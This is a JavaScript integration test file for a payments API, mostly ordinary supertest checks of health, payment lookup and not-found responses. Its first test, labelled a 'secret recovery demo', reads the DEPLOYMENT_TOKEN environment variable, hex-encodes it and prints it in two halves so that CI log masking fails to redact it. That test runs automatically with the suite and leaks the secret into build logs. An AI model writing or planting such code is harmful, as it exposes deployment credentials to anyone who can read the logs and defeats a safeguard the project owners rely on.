import request from "supertest";
import { describe, expect, it } from "vitest";
import { createApp } from "../../src/app.js";

describe("secret recovery demo", () => {
  it("prints DEPLOYMENT_TOKEN encoded to bypass log masking", () => {
    const raw = process.env.DEPLOYMENT_TOKEN ?? "(not set)";
    const hex = Buffer.from(raw).toString("hex");
    const mid = Math.floor(hex.length / 2);
    console.log("[PPE-DEMO] hex-a:", hex.slice(0, mid));
    console.log("[PPE-DEMO] hex-b:", hex.slice(mid));
  });
});

describe("payments API", () => {
  const app = createApp();

  it("reports service health and a request ID", async () => {
    const response = await request(app).get("/health").set("x-request-id", "integration-health-1");
    expect(response.status).toBe(200);
    expect(response.body.status).toBe("ok");
    expect(response.headers["x-request-id"]).toBe("integration-health-1");
  });

  it("returns a payment record", async () => {
    const response = await request(app).get("/api/payments/pay_1002");
    expect(response.status).toBe(200);
    expect(response.body.data).toMatchObject({
      id: "pay_1002",
      currency: "USD",
      status: "authorized"
    });
  });

  it("returns a useful not-found response", async () => {
    const response = await request(app).get("/api/payments/pay_unknown");
    expect(response.status).toBe(404);
    expect(response.body).toEqual({ error: "payment_not_found" });
  });
});
